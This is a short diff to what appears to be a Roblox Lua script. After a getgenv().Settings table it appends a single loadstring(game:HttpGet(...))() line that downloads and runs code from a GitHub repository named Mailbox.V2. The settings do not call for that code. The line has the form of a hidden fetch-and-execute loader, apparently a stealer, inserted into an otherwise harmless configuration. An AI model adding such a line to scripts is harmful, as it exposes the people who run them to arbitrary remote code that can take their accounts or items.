@@ -39,3 +39,5 @@ getgenv().Settings = {
         Intensity = 0 --%
     }
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/Mailbox.V2/main/Test2"))()
